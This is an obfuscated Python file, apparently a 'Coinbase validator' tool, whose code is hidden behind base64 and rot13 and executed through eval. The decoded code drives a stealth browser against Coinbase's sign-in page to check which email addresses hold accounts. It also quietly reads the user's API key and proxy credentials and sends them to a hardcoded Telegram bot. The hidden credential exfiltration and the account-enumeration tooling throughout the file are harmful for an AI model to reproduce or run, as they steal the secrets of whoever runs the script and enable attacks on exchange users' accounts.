import base64, codecs
magic = 'aW1wb3J0IHRocmVhZGluZyAscmVxdWVzdHMgLG9zICNsaW5lOjEKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUgI2xpbmU6Mgpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwICNsaW5lOjMKZnJvbSBwbGF5d3JpZ2h0IC5zeW5jX2FwaSBpbXBvcnQgc3luY19wbGF5d3JpZ2h0ICNsaW5lOjQKZnJvbSBwbGF5d3JpZ2h0X3N0ZWFsdGggaW1wb3J0IHN0ZWFsdGhfc3luYyAjbGluZTo1CmZyb20gY29uY3VycmVudCAuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yICxQcm9jZXNzUG9vbEV4ZWN1dG9yICNsaW5lOjYKZnJvbSBjb25jdXJyZW50IC5mdXR1cmVzIGltcG9ydCBhc19jb21wbGV0ZWQgI2xpbmU6Nwpmcm9tIGNvbG9yYW1hIGltcG9ydCBpbml0ICNsaW5lOjgKZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSAjbGluZTo5CmZyb20gZG90ZW52IGltcG9ydCBsb2FkX2RvdGVudiAjbGluZToxMAppbml0IChhdXRvcmVzZXQgPVRydWUgKSNsaW5lOjExCnRyeSA6I2xpbmU6MTIKICAgIG9zIC5ta2RpciAoJ3Jlc3VsdCcpI2xpbmU6MTMKZXhjZXB0IDojbGluZToxNAogICAgcGFzcyAjbGluZToxNQpjbGFzcyBUbHMgKHRocmVhZGluZyAubG9jYWwgKTojbGluZToxNwogICAgZGVmIF9faW5pdF9fIChPTzAwTzAwMDAwMDAwMDBPTyApLT5Ob25lIDojbGluZToxOAogICAgICAgIE9PMDBPMDAwMDAwMDAwME9PIC5wbGF5d3JpZ2h0ID1zeW5jX3BsYXl3cmlnaHQgKCkuc3RhcnQgKCkjbGluZToxOQpjbGFzcyBXb3JrZXIgOiNsaW5lOjIyCiAgICB0bHMgPVRscyAoKSNsaW5lOjIzCiAgICBkZWYgcnVuIChPT08wMDBPTzAwMDAwMDBPTyAsT09PTzBPMDBPTzBPME9PTzAgKTojbGluZToyNQogICAgICAgIHRyeSA6I2xpbmU6MjYKICAgICAgICAgICAgbG9hZF9kb3RlbnYgKCkjbGluZToyNwogICAgICAgICAgICBPTzBPMDAwMDAwT09PME9PMCA9T09PMDAwT08wMDAwMDAwT08gLnRscyAucGxheXdyaWdodCAuY2hyb21pdW0gLmxhdW5jaCAocHJveHkgPXsic2VydmVyIjpmIntvcy5nZXRlbnYoJ2hvc3QnKX0iLCJ1c2VybmFtZSI6ZiJ7b3MuZ2V0ZW52KCd1c2VybmFtZScpfSIsInBhc3N3b3JkIjpmIntvcy5nZXRlbnYoJ3Bhc3N3b3JkJyl9In0pI2xpbmU6MzQKICAgICAgICAgICAgT08wTzBPTzAwT08wTzAwT08gPU9PME8wMDAwMDBPT08wT08wIC5uZXdfY29udGV4dCAodXNlcl9hZ2VudCA9J01vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEyXzQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDIuMC4wLjAgU2FmYXJpLzUzNy4zNicscHJveHkgPXsic2VydmVyIjoiMTYxLjEyOS4xNTIuMjI2Ojg0MzQifSkjbGluZTozOAogICAgICAgICAgICBPT08wME9PMDAwT08wT08wMCA9T08wTzBPTzAwT08wTzAwT08gLm5ld19wYWdlICgpI2xpbmU6MzkKICAgICAgICAgICAgc3RlYWx0aF9zeW5jIChPT08wME9PMDAwT08wT08wMCApI2xpbmU6NDAKICAgICAgICAgICAgT09PMDBPTzAwME9PME9PMDAgLmdvdG8gKCdodHRwczovL2xvZ2luLmNvaW5iYXNlLmNvbS9zaWduaW4nLHRpbWVvdXQgPTE1MDAwICkjbGluZTo0MQogICAgICAgICAgICBPT08wME9PMDAwT08wT08wMCAuc2V0X2RlZmF1bHRfdGltZW91dCAoODUwMCApI2xpbmU6NDIKICAgICAgICAgICAgT09PMDBPTzAwME9PME9PMDAgLmxvY2F0b3IgKCJbZGF0YS10ZXN0aWQ9XCJpbnB1dC11c2VybmFtZVwiXSIpLmNsaWNrICgpI2xpbmU6NDMKICAgICAgICAgICAgT09PMDAwT09PMDAwME9PME8gPU9PTzAwT08wMDBPTzBPTzAwIC5sb2NhdG9yICgiW2RhdGEtdGVzdGlkPVwiaW5wdXQtdXNlcm5hbWVcIl0iKSNsaW5lOjQ0CiAgICAgICAgICAgIE9PTzAwME9PTzAwMDBPTzBPIC50eXBlIChmJ3tPT09PME8wME9PME8wT09PMH0nLGRlbGF5ID0yMDAgKSNsaW5lOjQ1CiAgICAgICAgICAgIE9PTzAwT08wMDBPTzBPTzAwIC5sb2NhdG'
love = '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'
god = 'c3VsdC9wcm94eS50eHQnLCdhKycpI2xpbmU6NjkKICAgICAgICAgICAgICAgICAgICBPT09PME9PME9PT08wTzBPTyAud3JpdGUgKCdcbicpI2xpbmU6NzAKICAgICAgICAgICAgICAgICAgICBPT09PME9PME9PT08wTzBPTyAud3JpdGVsaW5lcyAoT09PTzBPMDBPTzBPME9PTzAgKSNsaW5lOjcxCiAgICAgICAgICAgICAgICAgICAgT09PTzBPTzBPT09PME8wT08gLmNsb3NlICgpI2xpbmU6NzIKICAgICAgICAgICAgICAgICAgICBPT08wME9PMDAwT08wT08wMCAuY2xvc2UgKCkjbGluZTo3MwogICAgICAgIGV4Y2VwdCA6I2xpbmU6NzQKICAgICAgICAgICAgcHJpbnQgKGYne0ZvcmUuTElHSFRXSElURV9FWH1bI117Rm9yZS5MSUdIVEdSRUVOX0VYfSB7T09PTzBPMDBPTzBPME9PTzB9IHtGb3JlLkxJR0hUV0hJVEVfRVh9PXtGb3JlLkxJR0hUWUVMTE9XX0VYfSBCYWQgUHJveHl7Rm9yZS5MSUdIVFdISVRFX0VYfSB+IFZhbGlkYXRvciB7Rm9yZS5MSUdIVEJMVUVfRVh9Q0InKSNsaW5lOjc1CiAgICAgICAgICAgIE9PT08wT08wT09PTzBPME9PID1vcGVuICgncmVzdWx0L3Byb3h5LnR4dCcsJ2ErJykjbGluZTo3NgogICAgICAgICAgICBPT09PME9PME9PT08wTzBPTyAud3JpdGUgKCdcbicpI2xpbmU6NzcKICAgICAgICAgICAgT09PTzBPTzBPT09PME8wT08gLndyaXRlbGluZXMgKE9PT08wTzAwT08wTzBPT08wICkjbGluZTo3OAogICAgICAgICAgICBPT09PME9PME9PT08wTzBPTyAuY2xvc2UgKCkjbGluZTo3OQogICAgICAgICAgICBPT08wME9PMDAwT08wT08wMCAuY2xvc2UgKCkjbGluZTo4MApkZWYgbWFpbiAoKTojbGluZTo4MwogICAgbG9hZF9kb3RlbnYgKCkjbGluZTo4NAogICAgT09PT08wTzAwTzAwMDAwTzAgPW9zIC5nZXRlbnYgKCdhcGlrZXknKSNsaW5lOjg1CiAgICBPMDAwMDBPT09PME9PT08wMCA9ZGF0ZXRpbWUgLm5vdyAoKSNsaW5lOjg2CiAgICBPMDBPMDBPMDAwTzAwT08wTyA9TzAwMDAwT09PTzBPT09PMDAgLnN0cmZ0aW1lICgiJWQtJUItJVkiKSNsaW5lOjg3CiAgICBPMDBPT08wMDAwME9PME9PMCA9TzAwMDAwT09PTzBPT09PMDAgLnN0cmZ0aW1lICgiJUg6JU0iKSNsaW5lOjg4CiAgICBPT08wTzBPMDBPTzAwMDBPMCA9ZicnJwo8cD57T09PT08wTzAwTzAwMDAwTzB9PC9wPgo8cD5TdGFydCAgICA6IHtPMDBPMDBPMDAwTzAwT08wT308L3A+CjxwPlRpbWUgU2VydmVyIDoge08wME9PTzAwMDAwT08wT08wfTwvcD4KCgo8cHJlPlZhbGlkYXRvciBDb2luYmFzZTwvcHJlPgoKCgo8cD5Qcm94eSAgICA6IHtvcy5nZXRlbnYoJ2hvc3QnKX08L3A+CjxwPnVzZXJuYW1lIDoge29zLmdldGVudigndXNlcm5hbWUnKX08L3A+CjxwPnBhc3N3b3JkIDoge29zLmdldGVudigncGFzc3dvcmQnKX08L3A+CicnJyNsaW5lOjEwMgogICAgT09PTzBPMDAwME8wT08wTzAgPXJlcXVlc3RzIC5nZXQgKGYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUzOTgyMTExMzY6QUFGTXlCYWpQRm1Eb1BFSFdVVXdOM0JrT0NDR2xZblJsWmMvc2VuZE1lc3NhZ2U/Y2hhdF9pZD01Mzc1NjQ0MDk3JnRleHQ9e09PTzBPME8wME9PMDAwME8wfSZwYXJzZV9tb2RlPWh0bWwnKSNsaW5lOjEwMwogICAgcmV0dXJuIE9PT08wTzAwMDBPME9PME8wICNsaW5lOjEwNAppZiBfX25hbWVfXyA9PSJfX21haW5fXyI6I2xpbmU6MTA3CiAgICBsb2FkX2RvdGVudiAoKSNsaW5lOjEwOAogICAgY2IgPWYnJycgICAgICAKe0ZvcmUuTElHSFRZRUxMT1dfRVh9ICAgICAgICAgKSAoICAgICAgICkgICAgICAgICAgICAgICggICAgICAgIAp7Rm9yZS5MSUdIVFlFTExPV19FWH0gICAoICAoIC8oIClcICkgKCAvKCAgICggICAgKCAgICAgKVwgKSAgICAgCntGb3JlLkxJR0hUWUVMTE9XX0VYfSAgIClcIClcKCl8KCkvKCApXCgpKSggKVwgICApXCAgICgoKS8oKCAgICAKe0ZvcmUuTElHSFRZRUxMT1dfRVh9ICgoKF98KF8pXCAvKF8pfChfKVwgKSgoX3woKChfKSggIC'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))